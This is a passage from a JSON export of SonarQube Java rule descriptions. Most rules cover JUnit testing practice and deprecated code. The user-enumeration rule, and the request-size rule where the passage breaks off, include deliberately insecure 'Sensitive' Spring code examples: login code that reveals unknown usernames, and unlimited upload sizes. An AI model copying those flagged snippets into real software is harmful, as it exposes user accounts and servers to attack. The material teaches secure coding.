</li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  if(user == null) {\n      throw new UsernameNotFoundException(\"user not found\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> is set to false: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(false); // Sensitive\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the same message should be used regardless of whether it is the wrong user or password: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) throws AuthenticationException {\n  Details user = null;\n  try {\n    user = loadUserByUsername(username);\n  } catch (UsernameNotFoundException | DataAccessException e) {\n    // Hide this exception reason to not disclose that the username doesn't exist\n  }\n  if (user == null || !user.isPasswordCorrect(password)) {\n     // User should not be able to guess if the bad credentials message is related to the username or the password\n    throw new BadCredentialsException(\"Bad credentials\");\n  }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> should be set to true: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(true); // Compliant\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5804","summary":"Allowing user enumeration is security-sensitive","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>@VisibleForTesting can be used to mark methods, fields and classes whose visibility restrictions have been relaxed more than necessary for the API\nto allow for easier unit testing.</p>\n<p>Access to such methods, fields and classes only possible thanks to this relaxed visibility is fine for test code, but it should be avoided in\nproduction code. In production code these methods should be treated as if they are private.</p>\n<p>Supported framework:</p>\n<ul>\n  <li> Guava: <code>com.google.common.annotations.VisibleForTesting</code> </li>\n  <li> AssertJ: <code>org.assertj.core.util.VisibleForTesting</code> </li>\n  <li> Android: <code>androidx.annotation.VisibleForTesting</code> </li>\n  <li> Apache Flink: <code>org.apache.flink.annotation.VisibleForTesting</code> </li>\n</ul>\n<p>or any other annotation named <code>VisibleForTesting</code></p>\n<h3>Noncompliant code example</h3>\n<pre>\n/** src/main/java/MyObject.java */\n\n@VisibleForTesting String foo;\n\n/** src/main/java/Service.java */\n\nnew MyObject().foo; // Noncompliant, foo is accessed from production code\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n/** src/main/java/MyObject.java */\n\n@VisibleForTesting String foo;\n\n/** src/test/java/MyObjectTest.java */\n\nnew MyObject().foo; // Compliant, foo is accessed from test code\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5803","summary":"Class members annotated with \"@VisibleForTesting\" should not be accessed from production code","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>As mentioned in JUnit5 documentation, it is possible to integrate JUnit4 with JUnit5:</p>\n<blockquote>\n  <p>JUnit provides a gentle migration path via a JUnit Vintage test engine which allows existing tests based on JUnit 3 and JUnit 4 to be executed\n  using the JUnit Platform infrastructure. Since all classes and annotations specific to JUnit Jupiter reside under a new org.junit.jupiter base\n  package, having both JUnit 4 and JUnit Jupiter in the classpath does not lead to any conflicts.</p>\n</blockquote>\n<p>However, maintaining both systems is a temporary solution. This rule flags all the annotations from JUnit4 which would need to be migrated to\nJUnit5, hence helping migration of a project.</p>\n<p>Here is the list of JUnit4 annotations tracked by the rule, with their corresponding annotations in JUnit5:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>JUnit4</th>\n      <th>JUnit5</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><code>org.junit.Test</code></p></td>\n      <td><p><code>org.junit.jupiter.api.Test</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.Before</code></p></td>\n      <td><p><code>org.junit.jupiter.api.BeforeEach</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.After</code></p></td>\n      <td><p><code>org.junit.jupiter.api.AfterEach</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.BeforeClass</code></p></td>\n      <td><p><code>org.junit.jupiter.api.BeforeAll</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.AfterClass</code></p></td>\n      <td><p><code>org.junit.jupiter.api.AfterAll</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.Ignore</code></p></td>\n      <td><p><code>org.junit.jupiter.api.Disabled</code></p></td>\n    </tr>\n  </tbody>\n</table>\n<p>Note that the following annotations might requires some rework of the tests to have JUnit5 equivalent behavior. A simple replacement of the\nannotation wonât work immediately:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>JUnit4</th>\n      <th>JUnit5</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><code>org.junit.experimental.categories.Category</code></p></td>\n      <td><p><code>org.junit.jupiter.api.Tag</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.Rule</code></p></td>\n      <td><p><code>org.junit.jupiter.api.extension.ExtendWith</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.ClassRule</code></p></td>\n      <td><p><code>org.junit.jupiter.api.extension.RegisterExtension</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>org.junit.runner.RunWith</code></p></td>\n      <td><p><code>org.junit.jupiter.api.extension.ExtendWith</code></p></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Noncompliant code example</h3>\n<pre>\npackage org.foo;\n\nimport org.junit.After;\nimport org.junit.AfterClass;\nimport org.junit.Before;\nimport org.junit.BeforeClass;\nimport org.junit.Ignore;\nimport org.junit.Test;\nimport org.junit.experimental.categories.Category;\nimport org.junit.runner.RunWith;\n\n@RunWith(MyJUnit4Runner.class)\npublic class MyJUnit4Test {\n\n  @BeforeClass\n  public static void beforeAll() {\n    System.out.println(\"beforeAll\");\n  }\n\n  @AfterClass\n  public static void afterAll() {\n    System.out.println(\"AfterAll\");\n  }\n\n  @Before\n  public void beforeEach() {\n    System.out.println(\"beforeEach\");\n  }\n\n  @After\n  public void afterEach() {\n    System.out.println(\"afterEach\");\n  }\n\n  @Test\n  public void test1() throws Exception {\n    System.out.println(\"test1\");\n  }\n\n  public interface SomeTests { /* category marker */ }\n\n  @Test\n  @Category(SomeTests.class)\n  public void test2() throws Exception {\n    System.out.println(\"test2\");\n  }\n\n  @Test\n  @Ignore(\"Requires fix of #42\")\n  public void ignored() throws Exception {\n    System.out.println(\"ignored\");\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npackage org.foo;\n\nimport org.junit.jupiter.api.AfterAll;\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeAll;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Disabled;\nimport org.junit.jupiter.api.Tag;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\n\n@ExtendWith(MyJUnit5Extension.class)\nclass MyJUnit5Test {\n\n  @BeforeAll\n  static void beforeAll() {\n    System.out.println(\"beforeAll\");\n  }\n\n  @AfterAll\n  static void afterAll() {\n    System.out.println(\"afterAll\");\n  }\n\n  @BeforeEach\n  void beforeEach() {\n    System.out.println(\"beforeEach\");\n  }\n\n  @AfterEach\n  void afterEach() {\n    System.out.println(\"afterEach\");\n  }\n\n  @Test\n  void test1() {\n    System.out.println(\"test1\");\n  }\n\n  @Test\n  @Tag(\"SomeTests\")\n  void test2() {\n    System.out.println(\"test2\");\n  }\n\n  @Test\n  @Disabled(\"Requires fix of #42\")\n  void disabled() {\n    System.out.println(\"ignored\");\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4\">JUnit 5: Migrating from JUnit4</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5793","summary":"Migrate your tests from JUnit4 to the new JUnit5 annotations","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>If not annotated with <code>@Nested</code>, an inner class containing some tests will never be executed during tests execution. While you could\nstill be able to manually run its tests in an IDE, it wonât be the case during the build. By contrast, a static nested class containing some tests\nshould not be annotated with <code>@Nested</code>, JUnit5 will not share setup and state with an instance of its enclosing class.</p>\n<p>This rule raises an issue on inner classes and static nested classes containing JUnit5 test methods which has a wrong usage of <code>@Nested</code>\nannotation.</p>\n<p>Note: This rule does not check if the context in which JUnit 5 is running (e.g. Maven Surefire Plugin) is properly configured to execute static\nnested classes, it could not be the case using the default configuration.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyJunit5Test {\n  @Test\n  void test() { /* ... */ }\n\n  class InnerClassTest { // Noncompliant, missing @Nested annotation\n    @Test\n    void test() { /* ... */ }\n  }\n\n  @Nested\n  static class StaticNestedClassTest { // Noncompliant, invalid usage of @Nested annotation\n    @Test\n    void test() { /* ... */ }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.Nested;\n\nclass MyJunit5Test {\n  @Test\n  void test() { /* ... */ }\n\n  @Nested\n  class InnerClassTest {\n    @Test\n    void test() { /* ... */ }\n  }\n\n  static class StaticNestedClassTest {\n    @Test\n    void test() { /* ... */ }\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5790","summary":"JUnit5 inner test classes should be annotated with @Nested","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<p>JUnit5 test classes and methods should generally have package visibility. To fix this issue, change their visibility to the default package\nvisibility.</p>\n<h2>Why is this an issue?</h2>\n<p>JUnit5 is more tolerant regarding the visibility of test classes and methods than JUnit4, which required everything to be <code>public</code>. Test\nclasses and methods can have any visibility except <code>private</code>. It is however recommended to use the default package visibility to improve\nreadability.</p>\n<blockquote>\n  <p>Test classes, test methods, and lifecycle methods are not required to be <code>public</code>, but they must not be <code>private</code>.</p>\n  <p>It is generally recommended to omit the public modifier for test classes, test methods, and lifecycle methods unless there is a technical reason\n  for doing so â for example, when a test class is extended by a test class in another package. Another technical reason for making classes and\n  methods public is to simplify testing on the module path when using the Java Module System.</p>\n</blockquote>  â JUnit5 User Guide\n<h3>What is the potential impact?</h3>\n<p>The code will be non-conventional and readability can be slightly affected.</p>\n<h3>Exceptions</h3>\n<p>This rule does not raise an issue when the visibility is set to <code>private</code>, because <code>private</code> test methods and classes are\nsystematically ignored by JUnit5, without a proper warning. In this case, there is also an impact on reliability and so it is handled by the rule\n{rule:java:S5810}.</p>\n<h2>How to fix it</h2>\n<p>You can simply change the visibility by removing the <code>public</code> or <code>protected</code> keywords.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.junit.jupiter.api.Test;\n\npublic class MyClassTest { // Noncompliant - modifier can be removed\n  @Test\n  protected void test() { // Noncompliant - modifier can be removed\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  void test() {\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#writing-tests-classes-and-methods\">JUnit5 User Guide: Test Classes and Methods</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-5786","summary":"JUnit5 test classes and methods should have default package visibility","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Testing equality or nullness with JUnitâs <code>assertTrue()</code> or <code>assertFalse()</code> should be simplified to the corresponding\ndedicated assertion.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nAssert.assertTrue(a.equals(b));\nAssert.assertTrue(a == b);\nAssert.assertTrue(a == null);\nAssert.assertTrue(a != null);\nAssert.assertFalse(a.equals(b));\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nAssert.assertEquals(a, b);\nAssert.assertSame(a, b);\nAssert.assertNull(a);\nAssert.assertNotNull(a);\nAssert.assertNotEquals(a, b);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5785","summary":"JUnit assertTrue/assertFalse should be simplified to the corresponding dedicated assertion","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>When verifying that code raises an exception, a good practice is to avoid having multiple method calls inside the tested code, to be explicit about\nwhat is exactly tested.</p>\n<p>When two of the methods can raise the same <strong>checked</strong> exception, not respecting this good practice is a bug, since it is not possible\nto know what is really tested.</p>\n<p>You should make sure that only one method can raise the expected checked exception in the tested code.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\npublic void testG() {\n  // Do you expect g() or f() throwing the exception?\n  assertThrows(IOException.class, () -&gt; g(f(1)) ); // Noncompliant\n}\n\n@Test\npublic void testGTryCatchIdiom() {\n  try { // Noncompliant\n    g(f(1));\n    Assert.fail(\"Expected an IOException to be thrown\");\n  } catch (IOException e) {\n    // Test exception message...\n  }\n}\n\nint f(int x) throws IOException {\n  // ...\n}\n\nint g(int x) throws IOException {\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\npublic void testG() {\n  int y = f(1);\n  // It is explicit that we expect an exception from g() and not f()\n  assertThrows(IOException.class, () -&gt; g(y) );\n}\n\n@Test\npublic void testGTryCatchIdiom() {\n  int y = f(1);\n  try {\n    g(y);\n    Assert.fail(\"Expected an IOException to be thrown\");\n  } catch (IOException e) {\n    // Test exception message...\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5783","summary":"Only one method invocation is expected when testing checked exceptions","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Assertion methods&nbsp;are throwing a \"<code>java.lang.AssertionError</code>\". If this call is done within the try block of a try-catch cathing a\nsimilar error, you should make sure to test some properties of the exception. Otherwise, the assertion will never fail.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\npublic void should_throw_assertion_error() {\n  try {\n    throwAssertionError();\n    Assert.fail(\"Expected an AssertionError!\"); // Noncompliant, the AssertionError will be caught and the test will never fail.\n  } catch (AssertionError e) {}\n}\n\nprivate void throwAssertionError() {\n  throw new AssertionError(\"My assertion error\");\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThrows(AssertionError.class, () -&gt; throwAssertionError());\n</pre>\n<pre>\ntry {\n   throwAssertionError();\n   Assert.fail(\"Expected an AssertionError!\"); // Compliant, we made sure to test that the correct error is raised\n } catch (AssertionError e) {\n   Assert.assertThat(e.getMessage(), is(\"My assertion error\"));\n }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit 4 exception testing documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5779","summary":"Assertion methods should not be used within the try block of a try-catch catching an Error","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When verifying that code raises a runtime exception, a good practice is to avoid having multiple method calls inside the tested code, to be\nexplicit about which method call is expected to raise the exception.</p>\n<p>It increases the clarity of the test, and avoid incorrect testing when another method is actually raising the exception.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\npublic void testToString() {\n  // Do you expect get() or toString() throwing the exception?\n  org.junit.Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get().toString());\n}\n\n@Test\npublic void testToStringTryCatchIdiom() {\n  try {\n    // Do you expect get() or toString() throwing the exception?\n    get().toString();\n    Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n  } catch (IndexOutOfBoundsException e) {\n    // Test exception message...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\npublic void testToString() {\n   Object obj = get();\n   Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());\n}\n\n@Test\npublic void testToStringTryCatchIdiom() {\n  Object obj = get();\n  try {\n    obj.toString();\n    Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n  } catch (IndexOutOfBoundsException e) {\n    // Test exception message...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5778","summary":"Only one method invocation is expected when testing runtime exceptions","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When testing exception via <code>@Test</code> annotation, having additional assertions inside that test method can be problematic because any code\nafter the raised exception will not be executed. It will prevent you to test the state of the program after the raised exception and, at worst, make\nyou&nbsp;misleadingly think that it is executed.</p>\n<p>You should consider moving any assertions into a separate test method where possible, or using <a\nhref=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a> instead.</p>\n<p>Alternatively, you could use <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a> for JUnit\nversion &lt; 4.13 or if your project does not support lambdas.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test(expected = IndexOutOfBoundsException.class)\npublic void testShouldFail() {\n  get();\n  // This test pass since execution will never get past this line.\n  Assert.assertEquals(0, 1);\n}\n\nprivate Object get() {\n  throw new IndexOutOfBoundsException();\n}\n</pre>\n<h3>Compliant solution</h3>\n<ul>\n  <li> For JUnit &gt;= 4.13, use <a\n  href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a>: </li>\n</ul>\n<pre>\n// This test correctly fails.\n@Test\npublic void testToString() {\n    Object obj = get();\n    Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());\n    Assert.assertEquals(0, 1);\n}\n</pre>\n<ul>\n  <li> For JUnit &lt; 4.13, use the <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a>: </li>\n</ul>\n<pre>\n@Test\npublic void testShouldFail() {\n    Object obj = get();\n    try {\n        obj.toString();\n        Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n    } catch (IndexOutOfBoundsException e) {}\n    Assert.assertEquals(0, 1); // Correctly fails.\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5777","summary":"Exception testing via JUnit @Test annotation should be avoided","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When testing exception via <code>org.junit.rules.ExpectedException</code> any code after the raised exception will not be executed, so adding\nsubsequent assertions is wrong and misleading. This rule raises an issue when an assertion is done after the \"expect(â¦â)\" invocation, only the code\nthrowing the expected exception should be after \"expect(â¦â)\".</p>\n<p>You should consider using <a\nhref=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a> instead, itâs available\nsince JUnit 4.13 and it allows additional subsequent assertions.</p>\n<p>Alternatively, you could use <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a> for JUnit\nversion &lt; 4.13 or if your project does not support lambdas.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Rule\npublic ExpectedException thrown = ExpectedException.none();\n\n@Test\npublic void test() throws IndexOutOfBoundsException {\n  thrown.expect(IndexOutOfBoundsException.class); // Noncompliant\n  Object o = get();\n  // This test pass since execution will never get past this line.\n  Assert.assertEquals(0, 1);\n}\n\nprivate Object get() {\n  throw new IndexOutOfBoundsException();\n}\n</pre>\n<h3>Compliant solution</h3>\n<ul>\n  <li> For JUnit &gt;= 4.13, use <a\n  href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method\">org.junit.Assert.assertThrows</a>: </li>\n</ul>\n<pre>\nAssert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get());\n// This test correctly fails.\nAssert.assertEquals(0, 1);\n</pre>\n<ul>\n  <li> For JUnit &lt; 4.13, use the <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom\">try-catch idiom</a>: </li>\n</ul>\n<pre>\ntry {\n  get();\n  Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n} catch (IndexOutOfBoundsException e) {}\nAssert.assertEquals(0, 1); // Correctly fails.\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5776","summary":"Exception testing via JUnit ExpectedException rule should not be mixed with other assertions","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>With the introduction of Java 9, the standard annotation class <code>java.lang.Deprecated</code> has been updated with new parameters. Notably, a\nboolean parameter <code>forRemoval</code> has been added to clearly signify whether the deprecated code is intended to be removed in the future. This\nis indicated with <code>forRemoval=true</code>. The javadoc of the annotation explicitly mentions the following:</p>\n<blockquote>\n  <p>This annotation type has a boolean-valued element <code>forRemoval</code>. A value of <code>true</code> indicates intent to remove the annotated\n  program element in a future version. A value of <code>false</code> indicates that use of the annotated program element is discouraged, but at the\n  time the program element was annotated, there was no specific intent to remove it.</p>\n</blockquote>\n<p>While it is generally recommended for developers to steer clear of using deprecated classes, interfaces, and their deprecated members, those\nalready marked for removal will surely block you from upgrading your dependency. Usage of deprecated code should be avoided or eliminated as soon as\npossible to prevent accumulation and allow a smooth upgrade of dependencies.</p>\n<p>The deprecated code is usually no longer maintained, can contain some bugs or vulnerabilities, and usually indicates that there is a better way to\ndo the same thing. Removing it can even lead to significant improvement of your software.</p>\n<h2>How to fix it</h2>\n<p>Usage of deprecated classes, interfaces, and their methods explicitly marked for removal is discouraged. A developer should either migrate to\nalternative methods or refactor the code to avoid the deprecated ones.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\n/**\n * @deprecated As of release 1.3, replaced by {@link #Fee}. Will be dropped with release 1.4.\n */\n@Deprecated(forRemoval=true)\npublic class Foo { ... }\n\npublic class Bar {\n  /**\n   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}\n   */\n  @Deprecated(forRemoval=true)\n  public void doTheThing() { ... }\n\n  public void doTheThingBetter() { ... }\n\n  /**\n   * @deprecated As of release 1.14 due to poor performances.\n   */\n  @Deprecated(forRemoval=false)\n  public void doTheOtherThing() { ... }\n}\n\npublic class Qix extends Bar {\n  @Override\n  public void doTheThing() { ... } // Noncompliant; don't override a deprecated method marked for removal\n}\n\npublic class Bar extends Foo {  // Noncompliant; Foo is deprecated and will be removed\n\n  public void myMethod() {\n    Bar bar = new Bar();  // okay; the class isn't deprecated\n    bar.doTheThing();  // Noncompliant; doTheThing method is deprecated and will be removed\n\n    bar.doTheOtherThing(); // Okay; deprecated, but not marked for removal\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/477\">CWE-477 - Use of Obsolete Functions</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6TdGBQ\">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>\n  <li> RSPEC-1874 for standard deprecation use </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5738","summary":"\"@Deprecated\" code marked for removal should never be used","tags":["cwe","obsolete","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<p>With default limit value of 8388608 (8MB).</p>\n<p>A 100 MB file is allowed to be uploaded:</p>\n<pre>\n@Bean(name = \"multipartResolver\")\npublic CommonsMultipartResolver multipartResolver() {\n  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver();\n  